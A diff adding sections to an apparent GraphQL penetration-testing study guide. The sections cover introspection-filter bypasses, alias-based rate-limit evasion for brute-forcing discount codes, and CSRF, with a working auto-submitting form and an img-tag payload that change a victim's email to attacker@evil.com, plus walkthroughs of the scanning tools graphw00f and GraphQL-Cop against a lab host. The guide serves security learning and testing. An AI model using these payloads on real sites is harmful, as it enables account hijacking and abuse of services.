@@ -954,13 +954,270 @@ That single error message just confirmed a real field name exists — `productIn
 
 ---
 
+# 5. Bypassing GraphQL introspection defenses
 
+Some developers try to disable introspection by blocking any query containing the `__schema` keyword — usually using a **regex** (pattern matcher) to detect and reject it. The problem? These filters are often sloppy, and you can sneak past them with a couple of clever tricks.
 
+## Trick 1: Sneak in "Invisible" Characters
 
+GraphQL doesn't care about extra whitespace, newlines, or commas between keywords — it just ignores them when parsing the query. But a **poorly written regex might not be so forgiving**.
 
+So if a developer's filter is specifically looking for the literal string `__schema{` (schema immediately followed by an opening brace, no space), you can defeat it just by sneaking a space, newline, or comma in between — GraphQL still understands the query perfectly, but the filter doesn't recognize it as a match.
 
+**Example — sneaking a newline into the query:**
 
+```json
+{
+  "query": "query{__schema\n{queryType{name}}}"
+}
+```
 
+Notice the `\n` (newline) right after `__schema`. To GraphQL, this is identical to `__schema{...}` — completely valid. But to a naive regex looking for the exact string `__schema{`, it no longer matches, so the request sails through.
+
+You could try the same trick with a space or comma too:
+
+```json
+{
+  "query": "query{__schema,{queryType{name}}}"
+}
+```
+
+## Trick 2: Switch Up the Request Method
+
+Sometimes introspection is only blocked for **POST** requests — meaning the filter might not apply if you send the exact same query using a different method entirely, like **GET** or **POST with form-encoding** `x-www-form-urlencoded` instead of JSON.
+
+**Example — the same introspection probe sent as a GET request, URL-encoded:**
+
+```http
+GET /graphql?query=query%7B__schema%0A%7BqueryType%7Bname%7D%7D%7D
+```
+
+Decoded, this is just the same query as before, sent as URL parameters instead of a JSON body:
+
+```
+query{__schema
+{queryType{name}}}
+```
+
+Same result — if the server's block was only configured for one method (say, POST), sending it via GET can slip right past.
+
+---
+
+# 6. Bypassing rate limiting using aliases
+
+Normally, GraphQL won't let you request the same field twice in one query — it doesn't know how to label two identical results. **Aliases** solve this by letting you give each result a custom name, so you can ask for the same type of object multiple times in a single request.
+
+This is genuinely useful for legitimate use — say, fetching two different products by ID in one round trip instead of two. But it also opens the door to abuse.
+
+## Why This Breaks Rate Limiting
+
+Most rate limiters count **HTTP requests** — e.g., "block this IP after 10 requests per minute." They usually *don't* look inside the request to count how many individual operations are packed into it.
+
+Since aliases let you cram dozens (or hundreds) of queries into **one single HTTP request**, an attacker can effectively perform a large brute-force attack while only ever sending "1 request" as far as the rate limiter is concerned.
+
+## Example: Brute-Forcing Discount Codes
+
+Imagine a GraphQL API that checks whether a discount code is valid:
+
+```graphql
+query isValidDiscount($code: Int) {
+  isValidDiscount(code: $code) {
+    valid
+  }
+}
+```
+
+Normally, to brute-force many codes, you'd send this query repeatedly — once per code — which a rate limiter would eventually block.
+
+Instead, using aliases, you can bundle multiple guesses into **one single request**:
+
+```graphql
+query isValidDiscount($code: Int) {
+  isValidDiscount(code: $code) {
+    valid
+  }
+  isValidDiscount2: isValidDiscount(code: $code) {
+    valid
+  }
+  isValidDiscount3: isValidDiscount(code: $code) {
+    valid
+  }
+}
+```
+
+Each aliased field (`isValidDiscount2`, `isValidDiscount3`, etc.) is really the *same* operation, just run again under a different label — and each can be checking a **different discount code value** in practice. To the server, this all arrives as **one HTTP request**, so a request-count-based rate limiter never notices anything unusual, even though dozens of checks just happened at once.
+
+An attacker could scale this up to hundreds of aliases in a single request, checking hundreds of codes while technically staying under the radar of "X requests per minute" style protections.
+
+---
+
+# 7. GraphQL CSRF
+
+**CSRF (Cross-Site Request Forgery)** is an attack where a malicious website tricks a victim's browser into sending a request to a *different* site — one the victim is already logged into — without the victim realizing it. Because the browser automatically attaches the victim's cookies/session, the target site thinks the request genuinely came from that logged-in user.
+
+GraphQL isn't immune to this. If set up carelessly, an attacker can build a page that silently makes your browser fire off a GraphQL query or mutation *as you* — without you ever knowing.
+
+## Why This Happens
+
+The vulnerability boils down to two missing protections:
+
+1. **No content-type validation** on the server
+2. **No CSRF tokens** (a secret, unpredictable value the server checks to confirm the request came from a legitimate page, not a forged one)
+
+### The Safe Case: JSON POST Requests
+
+If a GraphQL endpoint **only** accepts `POST` requests with `Content-Type: application/json`, it's naturally protected — browsers simply **can't** be tricked into sending a JSON-typed request through normal HTML mechanisms (like a form or image tag) from another site. So even without CSRF tokens, this setup is relatively safe *as long as the server actually checks and enforces that content type*.
+
+```http
+POST /graphql HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/json
+
+{"query": "mutation { changeEmail(email: \"attacker@evil.com\") }"}
+```
+A malicious webpage **cannot** get a victim's browser to auto-send this exact request — browsers restrict cross-site JSON POSTs from things like plain HTML forms.
+
+### The Dangerous Case: Other Methods/Content-Types
+
+Problems appear when the endpoint is also willing to accept:
+
+- **GET requests**, or
+- **POST requests with `Content-Type: application/x-www-form-urlencoded`**
+
+These *can* be triggered by a browser automatically, using nothing more than a plain HTML form or link — no fancy JavaScript needed.
+
+**Example — malicious auto-submitting form hosted on an attacker's site:**
+
+```html
+<form action="https://vulnerable-website.com/graphql" method="POST" enctype="application/x-www-form-urlencoded">
+  <input type="hidden" name="query" value="mutation { changeEmail(email: &quot;attacker@evil.com&quot;) }">
+</form>
+<script>
+  document.forms[0].submit();
+</script>
+```
+
+If the victim (already logged into `vulnerable-website.com`) simply visits the attacker's page, their browser auto-submits this form — silently changing their email to one the attacker controls, using the victim's own session cookies.
+
+**Example — even simpler, via GET:**
+
+```html
+<img src="https://vulnerable-website.com/graphql?query=mutation{changeEmail(email:%22attacker@evil.com%22)}">
+```
+
+If the endpoint accepts GraphQL queries via `GET`, an attacker doesn't even need a form — just embedding this as an image tag can trigger the malicious mutation the instant the victim's browser loads the page.
+
+---
+
+# 8. Tools of trade
+
+## 8.1 - graphw00f
+
+After logging in to the sample web application and investigating all functionality, we can observe multiple requests to the `/graphql` endpoints that contain GraphQL queries:
+
+<img width="1546" height="507" alt="image" src="https://github.com/user-attachments/assets/f45ccbc2-b20e-450a-8fd8-22c21f6033a3" />
+
+Thus, we can definitively say that the web application implements **GraphQL**. As a first step, we will identify the `GraphQL engine` used by the web application using the tool `graphw00f`. 
+
+`Graphw00f` will send various GraphQL queries, including malformed queries, and can determine the GraphQL engine by observing the backend's behavior and error messages in response to these queries.
+
+After cloning the git repository, we can run the tool using the `main.py` Python script. We will run the tool in fingerprint (`-f`) and detect mode (`-d`). We can provide the web application's base URL to let graphwoof attempt to find the GraphQL endpoint by itself:
+
+```
+$ python3 main.py -d -f -t http://172.17.0.2
+
+                +-------------------+
+                |     graphw00f     |
+                +-------------------+
+                  ***            ***
+                **                  **
+              **                      **
+    +--------------+              +--------------+
+    |    Node X    |              |    Node Y    |
+    +--------------+              +--------------+
+                  ***            ***
+                     **        **
+                       **    **
+                    +------------+
+                    |   Node Z   |
+                    +------------+
+
+                graphw00f - v1.1.17
+          The fingerprinting tool for GraphQL
+           Dolev Farhi <dolev@lethalbit.com>
+  
+[*] Checking http://172.17.0.2/
+[*] Checking http://172.17.0.2/graphql
+[!] Found GraphQL at http://172.17.0.2/graphql
+[*] Attempting to fingerprint...
+[*] Discovered GraphQL Engine: (Graphene)
+[!] Attack Surface Matrix: https://github.com/nicholasaleks/graphql-threat-matrix/blob/master/implementations/graphene.md
+[!] Technologies: Python
+[!] Homepage: https://graphene-python.org
+[*] Completed.
+```
+
+As we can see, the graphwoof identified the GraphQL engine Graphene. Additionally, it provides us with the corresponding detailed page in the `GraphQL-Threat-Matrix`, which provides more in-depth information about the identified GraphQL engine:
+
+<img width="1252" height="427" alt="image" src="https://github.com/user-attachments/assets/150dc199-fca5-4fba-973e-6311a1d78d93" />
+
+Lastly, by accessing the `/graphql` endpoint in a web browser directly, we can see that the web application runs a `graphiql` interface. This enables us to provide GraphQL queries directly, which is a lot more convenient than running the queries through Burp, as we do not need to worry about breaking the JSON syntax.
+
+## 8.2 - GraphQL-Voyager
+
+After using "general" introspection query that dumps all information about types, fields, and queries supported by the backend. 
+
+The result of this query is quite large and complex. However, we can visualize the schema using the tool `GraphQL-Voyager`. For this module, we will use the `GraphQL Demo`. 
+
+`However, in a real engagement, we should follow the GitHub instructions to host the tool ourselves so that we can ensure that no sensitive information leaves our system.`
+
+In the `demo`, we can click `CHANGE SCHEMA` and select `INTROSPECTION`. After pasting the result of the above introspection query in the text field and clicking on `DISPLAY`, the backend's GraphQL schema is visualized for us. We can explore all supported queries, types, and fields:
+
+<img width="1259" height="589" alt="image" src="https://github.com/user-attachments/assets/55c68dd7-f395-4b55-a732-93da04df2e50" />
+
+## 8.3 - GraphQL-Cop
+
+We can use the tool `GraphQL-Cop`, a security audit tool for GraphQL APIs. After cloning the GitHub repository and installing the required dependencies, we can run the `graphql-cop.py` Python script:
+
+```
+$ python3 graphql-cop.py  -v
+
+version: 1.13
+```
+
+We can then specify the GraphQL API's URL with the `-t` flag. GraphQL-Cop then executes multiple basic security configuration checks and lists all identified issues, which is a great baseline for further manual tests:
+
+```
+$ python3 graphql-cop/graphql-cop.py -t http://172.17.0.2/graphql
+
+[HIGH] Alias Overloading - Alias Overloading with 100+ aliases is allowed (Denial of Service - /graphql)
+[HIGH] Array-based Query Batching - Batch queries allowed with 10+ simultaneous queries (Denial of Service - /graphql)
+[HIGH] Directive Overloading - Multiple duplicated directives allowed in a query (Denial of Service - /graphql)
+[HIGH] Field Duplication - Queries are allowed with 500 of the same repeated field (Denial of Service - /graphql)
+[LOW] Field Suggestions - Field Suggestions are Enabled (Information Leakage - /graphql)
+[MEDIUM] GET Method Query Support - GraphQL queries allowed using the GET method (Possible Cross Site Request Forgery (CSRF) - /graphql)
+[LOW] GraphQL IDE - GraphiQL Explorer/Playground Enabled (Information Leakage - /graphql)
+[HIGH] Introspection - Introspection Query Enabled (Information Leakage - /graphql)
+[MEDIUM] POST based url-encoded query (possible CSRF) - GraphQL accepts non-JSON queries over POST (Possible Cross Site Request Forgery - /graphql)
+```
+
+## 8.4 - InQL
+
+`InQL` is a **Burp** extension we can install via the `BApp Store` in Burp. After a successful installation, an `InQL` tab is added in Burp.
+
+Furthermore, the extension adds `GraphQL` tabs in the Proxy History and Burp Repeater that enable simple modification of the GraphQL query without having to deal with the encompassing JSON syntax:
+
+<img width="1548" height="444" alt="image" src="https://github.com/user-attachments/assets/460f378c-3adb-46ea-bd69-cc5cde79d773" />
+
+Furthermore, we can right-click on a GraphQL request and select `Extensions > InQL - GraphQL Scanner > Generate queries with InQL Scanner`:
+
+<img width="1541" height="455" alt="image" src="https://github.com/user-attachments/assets/f87042a8-f5df-43fd-8f9d-f469ac290baf" />
+
+Afterward, InQL generates introspection information. The information regarding all mutations and queries is provided in the `InQL` tab for the scanned host:
+
+<img width="1402" height="608" alt="image" src="https://github.com/user-attachments/assets/0d0919b0-bcc8-4bd5-bb3a-7bf4f5850dce" />
+
+---
 
 
 
